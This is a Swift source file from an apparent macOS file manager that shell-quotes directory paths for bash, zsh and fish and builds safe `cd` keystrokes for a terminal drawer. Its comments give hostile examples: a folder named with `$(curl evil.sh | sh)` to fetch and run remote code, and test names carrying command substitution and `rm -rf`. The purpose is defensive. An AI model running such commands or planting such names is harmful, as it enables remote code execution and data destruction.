import Foundation

/// Building the text Dirnex types into a drawer's shell on the user's behalf — today, the `cd` that
/// makes the drawer follow the active panel (PLAN.md §M6 "bottom pane following active panel's
/// cwd").
///
/// This is the security-critical half of the drawer, and the reason it is pure and tested: a
/// directory name is **attacker-controlled data** — unzip an archive from the internet and you can
/// be browsing a folder called ``$(curl evil.sh | sh)`` — and everything here ends up on the command
/// line of an interactive shell that will execute it. Every byte we write is quoted by
/// `ShellQuoting`; nothing is interpolated raw.
public enum ShellQuoting {
    /// `path` as a single shell word, safe to place in a command line for `kind`.
    ///
    /// POSIX shells (and everything in `.other`) get single quotes, inside which **no** escape
    /// exists — `$`, backticks, `;`, `&`, `|`, spaces and newlines are all literal. That leaves one
    /// character to handle, the single quote itself, which ends the quoting; the classic
    /// `'` → `'\''` closes the string, escapes a literal quote, and reopens it.
    ///
    /// `fish` is the exception, and the reason `ShellKind` distinguishes it at all: its single
    /// quotes *do* honour backslash escapes, so a POSIX `'\''` would leave a stray backslash in the
    /// path. It needs `\` and `'` backslash-escaped instead.
    ///
    /// Verified against real shells: a directory named
    /// ``it's a "test" $(touch …) `touch …` ;rm -rf boom; & |x`` is entered correctly by both
    /// `zsh` and `bash`, with neither substitution firing.
    public static func quoted(_ path: String, for kind: ShellKind) -> String {
        switch kind {
        case .fish:
            let escaped = path
                .replacingOccurrences(of: "\\", with: "\\\\")
                .replacingOccurrences(of: "'", with: "\\'")
            return "'\(escaped)'"
        case .zsh, .bash, .other:
            return "'" + path.replacingOccurrences(of: "'", with: "'\\''") + "'"
        }
    }
}

/// The keystrokes that move a drawer's shell to a directory.
public enum ShellCommandLine {
    /// What to write into the shell's pseudo-terminal to put it in `directoryPath`.
    ///
    /// Three deliberate pieces sit in front of the command:
    ///
    /// - **`^U^K` clears whatever is already typed, and is a safety measure, not tidiness.** The
    ///   line editor may hold a half-typed command; appending `cd …` to it and pressing Return
    ///   would execute *their* words plus ours. Someone who had typed `rm -rf /` and thought better
    ///   of it would watch us run `rm -rf / cd -- '/x'`. `^U` kills to the start of the line and
    ///   `^K` to the end; either alone is enough in `zsh`, but `bash`'s `^U` only kills *backwards*
    ///   from the cursor, so a line abandoned with the cursor in the middle needs both.
    /// - **The space in front of `^U` is what keeps the drawer quiet**, and it is load-bearing for
    ///   `bash` alone. Readline binds `^U` to `unix-line-discard`, which *rings the bell* rather
    ///   than killing when the cursor is already at column zero — which is every idle prompt, i.e.
    ///   exactly the state the panel-follow `cd` is typed into. SwiftTerm renders that BEL as
    ///   `NSSound.beep()`, so browsing with the drawer open beeped on every pane switch, sounding
    ///   for all the world like a rejected keyboard shortcut. A character in front of `^U` means
    ///   there is always something to kill, so readline kills instead of dinging — and the space
    ///   goes with it. (`zsh` binds `^U` to `kill-whole-line`, which never dings; the beep only
    ///   ever sounded for `bash` users. Verified in a pty against both shells.)
    /// - **The leading space** asks the shell to keep our synthetic command out of the user's
    ///   history (`HIST_IGNORE_SPACE` in zsh, `HISTCONTROL=ignorespace` in bash). Neither is on by
    ///   default, so this is a courtesy that lands for the people who opted in, not a guarantee.
    ///   What keeps history genuinely clean is the caller: `ShellWorkingDirectory.command(toFollow:)`
    ///   emits nothing at all when the shell is already in the right place, which is the common case.
    /// - **`cd --`** ends option parsing, so a directory named `-p` is a path rather than a flag.
    ///   Panels only ever navigate to absolute paths, so this is belt-and-braces; `fish` is left
    ///   with a plain `cd` because its `cd` is a function whose `--` handling is not the shell's to
    ///   promise. (Plain `cd` also means a user's own `cd` — `zoxide`, an auto-`ls` wrapper — still
    ///   runs, which is their setup working as they configured it. `builtin cd` would be more
    ///   predictable for us and ruder to them.)
    public static func changeDirectory(to directoryPath: String, kind: ShellKind) -> String {
        let quoted = ShellQuoting.quoted(directoryPath, for: kind)
        let command = kind == .fish ? "cd \(quoted)" : "cd -- \(quoted)"
        return "\(clearLine) \(command)\n"
    }

    /// A space — so `bash`'s `^U` always has something to kill and never dings — then `^U` (kill to
    /// line start) and `^K` (kill to line end).
    private static let clearLine = " \u{15}\u{0B}"
}
